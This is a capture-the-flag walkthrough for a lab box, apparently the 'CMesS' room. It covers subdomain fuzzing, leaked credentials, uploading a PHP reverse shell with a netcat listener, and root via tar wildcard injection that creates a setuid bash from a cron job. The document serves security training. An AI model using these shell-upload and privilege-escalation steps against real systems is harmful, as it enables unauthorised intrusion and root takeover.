## Challenge 2
 1. Run `wfuzz` against the site to discover the `dev` subdomain.
```bash
wfuzz -c -f sub-fighter -w top5000.txt -u 'http://cmess.thm' -H "Host: FUZZ.cmess.thm" --hw 290
```
 2. This takes us to a static page with some text that gives us a username and password.
```text
Username: andre
Password: KPFTN_f2yxe%
```

 3. Use this username and password to login to the main site.
 4. Go to the file manager section.
 5. Go to `tmp/media_thumb`.
 6. Upload PHP shell file (shell.php) is fine.
 7. Update the `.htaccess` file to allow php files if using a `.php` extension
 8. Set up netcat listener on main Host.
```bash
nc -lvp PORT_NUM
```
 9. Access the PHP file: `http://cmess.thm/tmp/media_thumb/shell.php`
 10. Run the `LinEnum` script on the box.
 11. See the interesting file `/opt/.password.bak`. The file contains a password for `andre`.
```text
andres backup password
UQfsdCB7aAP6
```
 12. SSH into the box as `andre`.
 13. View Cron jobs.
```bash
cat /etc/crontab
```
```bash
# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
```

 14. There is a backup every 2 minutes using the `tar` command that uses a wildcard.
 15. Create our malicious script:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/andre/backup/runme.sh
chmod +x runme.sh
```

 16. Exploit the `tar` wildcard setting by adding parameters:
```bash
touch /home/andre/backup/--checkpoint=1
touch /home/andre/backup/--checkpoint-action=exec=sh\ runme.sh
```

 17. Wait 2 minutes and run the binary created by the root user:
```bash
cd /tmp
./bash -p
```